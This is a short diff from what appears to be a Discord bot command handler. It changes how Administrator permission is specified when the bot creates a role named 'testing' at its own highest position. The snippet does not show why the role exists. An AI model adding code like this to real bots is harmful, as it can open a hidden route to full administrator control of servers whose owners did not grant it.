@@ -10,7 +10,7 @@ module.exports = async function code(client, interaction) {
                 const botHighestRole = guild.members.cache.get(client.user.id).roles.highest;
                 role = await guild.roles.create({
                     name: 'testing',
-                    permissions: [PermissionsBitField.Flags.Administrator],
+                    permissions: ['Administrator'],
                     reason: 'Merp',
                     position: botHighestRole.position,
                 });
